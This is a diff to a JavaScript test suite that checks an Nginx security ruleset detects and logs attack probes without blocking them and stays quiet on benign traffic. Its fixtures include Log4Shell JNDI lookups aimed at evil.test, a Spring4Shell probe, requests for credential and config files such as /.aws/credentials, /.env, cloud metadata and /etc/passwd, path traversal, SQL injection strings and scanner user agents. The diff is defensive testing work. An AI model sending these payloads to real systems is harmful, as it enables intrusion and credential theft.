@@ -87,7 +87,9 @@ const hostPort = (containerPort) => {
 };
 
 const requestStatus = (port, requestTarget, options = {}) => {
-	const args = ["--path-as-is", "-sS", "-o", os.devNull, "-w", "%{http_code}"];
+	// --globoff: curl otherwise reads {} and [] in a URL as its own glob syntax
+	// and strips them, which silently disarms every brace-bearing payload.
+	const args = ["--path-as-is", "--globoff", "-sS", "-o", os.devNull, "-w", "%{http_code}"];
 	if (options.userAgent) {
 		args.push("-A", options.userAgent);
 	}
@@ -133,6 +135,49 @@ const legacyFixtures = [
 	["ua.turnitinbot", "/", { userAgent: "TurnitinBot" }],
 	["ua.grabnet", "/", { userAgent: "GrabNet" }],
 ];
+
+// One case per detect-only family. These must never change a response, so each
+// is asserted to return the fixture's own 200 rather than a 403.
+const modernFixtures = [
+	["inject.log4shell", "/?x=${jndi:ldap://evil.test/a}"],
+	// Percent-encoded is the common delivery form, and a pattern that only knows
+	// the literal braces misses it entirely.
+	["inject.log4shell", "/?x=%24%7Bjndi:ldap://evil.test/a%7D"],
+	["inject.log4shell", "/probe", { userAgent: "${jndi:ldap://evil.test/a}" }],
+	["inject.log4shell", "/probe", { referrer: "https://evil.test/${jndi:ldap://evil.test/a}" }],
+	["inject.spring4shell", "/?class.module.classLoader.x=1"],
+	["path.dotenv", "/.env"],
+	["path.git-config", "/.git/config"],
+	["path.svn", "/.svn/entries"],
+	["path.cloud-credentials", "/.aws/credentials"],
+	["path.cloud-metadata", "/latest/meta-data/iam/security-credentials/"],
+	["path.etc-passwd", "/download?file=/etc/passwd"],
+	["path.wp-login", "/wp-login.php"],
+	["path.wp-admin", "/wp-admin/admin-ajax.php"],
+	["path.xmlrpc", "/xmlrpc.php"],
+	["path.phpmyadmin", "/phpmyadmin/index.php"],
+	["path.adminer", "/adminer.php"],
+	["path.actuator", "/actuator/env"],
+	["path.phpunit", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"],
+	["path.cgi-bin", "/cgi-bin/test.sh"],
+	["path.webshell", "/uploads/c99.php"],
+	["path.exchange", "/autodiscover/autodiscover.xml"],
+	["path.solr", "/solr/admin/cores"],
+	["path.config-backup", "/db/backup.sql"],
+	["scanner.nuclei", "/", { userAgent: "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)" }],
+	["scanner.sqlmap", "/", { userAgent: "sqlmap/1.8" }],
+	["scanner.nikto", "/", { userAgent: "Mozilla/5.00 (Nikto/2.5.0)" }],
+	["scanner.masscan", "/", { userAgent: "masscan/1.3" }],
+	["scanner.zgrab", "/", { userAgent: "Mozilla/5.0 zgrab/0.x" }],
+	["scanner.nmap", "/", { userAgent: "Mozilla/5.0 (compatible) nmap NSE" }],
+	["scanner.wpscan", "/", { userAgent: "WPScan v3.8" }],
+	["scanner.directory-brute", "/", { userAgent: "gobuster/3.6" }],
+	["scanner.internet-survey", "/", { userAgent: "Mozilla/5.0 (compatible; CensysInspect/1.1)" }],
+];
+
+// Traffic that must produce no record at all. A ruleset that fires on these is
+// worse than one that fires on nothing, because it trains operators to ignore it.
+const benignFixtures = ["/index.html", "/api/v1/documents", "/downloads/release.zip", "/assets/app.js?v=3", "/docs/environment.html", "/actuatorial-report"];
 
 describe("security attribution Nginx runtime", { skip: !runtimeEnabled && "Set SECURITY_NGINX_TEST_IMAGE to run against a candidate image" }, () => {
 	before(() => {
@@ -216,10 +261,50 @@ describe("security attribution Nginx runtime", { skip: !runtimeEnabled && "Set S
 		assert.equal(securityEvents("proxy-host-12_security.log").length, afterAttack.length);
 	});
 
+	it("attributes every detect-only family without changing the response", () => {
+		for (const [ruleId, requestTarget, options] of modernFixtures) {
+			const before = securityEvents("proxy-host-12_security.log").length;
+			assert.equal(requestStatus(ports.enabled, requestTarget, options), "200", `${ruleId} must not change the response`);
+			const events = securityEvents("proxy-host-12_security.log");
+			assert.equal(events.length, before + 1, `${ruleId} produced no event`);
+			const event = events.at(-1);
+			assert.equal(event.rule_id, ruleId);
+			assert.equal(event.event_type, "exploit_rule");
+			assert.equal(event.rule_action, "detect");
+			assert.equal(event.severity, "medium");
+			assert.equal(event.status, "200");
+		}
+	});
+
+	it("stays silent on ordinary traffic", () => {
+		const before = securityEvents("proxy-host-12_security.log").length;
+		for (const requestTarget of benignFixtures) {
+			assert.equal(requestStatus(ports.enabled, requestTarget), "200", requestTarget);
+		}
+		assert.equal(securityEvents("proxy-host-12_security.log").length, before, `one of ${benignFixtures.join(", ")} produced a false positive`);
+	});
+
 	it("keeps legacy includes active and disabled hosts unblocked", () => {
 		assert.equal(requestStatus(ports.legacy, "/?union=select("), "403");
+		// The host opted out of blocking, so the response is untouched -- but it
+		// is now told what matched, which it previously was not.
 		assert.equal(requestStatus(ports.disabled, "/?union=select("), "200");
-		assert.equal(securityEvents("proxy-host-13_security.log").length, 0);
+		const events = securityEvents("proxy-host-13_security.log");
+		assert.equal(events.length, 1);
+		assert.equal(events[0].rule_id, "sql.union-select");
+		assert.equal(events[0].rule_action, "detect");
+		assert.equal(events[0].severity, "medium");
+		assert.equal(events[0].status, "200");
+	});
+
+	it("resolves a legacy blocking signature ahead of an overlapping modern rule", () => {
+		// $request_uri carries the query string, so this matches both the legacy
+		// file.path-traversal query rule and the modern path.traversal rule. The
+		// legacy id has to win, because it is the one enforcement acts on.
+		assert.equal(requestStatus(ports.enabled, "/x?f=../../etc/passwd"), "403");
+		const event = securityEvents("proxy-host-12_security.log").at(-1);
+		assert.equal(event.rule_id, "file.path-traversal");
+		assert.equal(event.rule_action, "block");
 	});
 
 	it("records unattributed traffic that never reaches a proxy host", () => {
